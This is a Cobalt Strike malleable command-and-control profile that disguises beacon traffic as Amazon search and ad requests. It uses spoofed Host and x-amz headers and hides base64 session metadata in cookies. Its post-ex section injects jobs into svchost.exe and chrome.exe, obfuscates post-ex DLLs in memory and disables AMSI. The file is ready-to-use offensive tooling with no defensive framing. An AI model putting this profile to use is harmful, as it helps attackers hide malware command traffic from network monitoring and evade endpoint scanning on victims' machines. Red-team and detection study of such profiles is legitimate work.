# 
# Modified version of @harmj0y's Amazon profile
#

set sleeptime "300";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.1 (Windows NT 7.0; WOW64; Trident/7.1; rv:12.0) like Gecko";

http-get {

    set uri "/s/ref=nb_sb_noss_1/167-3294888-0522950/field-keywords=books";

    client {

        header "Accept" "*/*";
        header "Host" "www.amazon.com";

        metadata {
            base64;
            prepend "session-token=";
            prepend "skin=noskin;";
            append "csm-hit=s-12KU11AA82RZSYGJ3BDK|2519899012985";
            header "Cookie";
        }
    }

    server {

        header "Server" "Server";
        header "x-amz-id-1" "VIKUYEZKCKPGY5T42PYU";
        header "x-amz-id-2" "b32yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmYGl4aHRvNDVpbgo=";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Content-Encoding" "gzip";

        output {
            print;
        }
    }
}

http-post {
    
    set uri "/N4215/adj/amzn.us.sr.aps";

    client {

        header "Accept" "*/*";
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";
        header "Host" "www.amazon.com";

        parameter "sz" "160x600";
        parameter "oe" "oe=ISO-3312-2;";

        id {
            parameter "sn";
        }

        parameter "s" "3717";
        parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";

        output {
            base64;
            print;
        }
    }

    server {

        header "Server" "Server";
        header "x-amz-id-1" "VIKUYEZKCKPGY5T42PYU";
        header "x-amz-id-2" "b32yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmYGl4aHRvNDVpbgo=";
        header "X-Frame-Options" "SAMEORIGIN";
        header "x-ua-compatible" "IE=edge";

        output {
            print;
        }
    }
}

post-ex {

    set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
    set spawnto_x64 "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";

    # scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way.
    set obfuscate "true";

    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";

    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true"; 
    # CAUTION!  Crashes temporary post-ex processes for latest win 10 
    
}
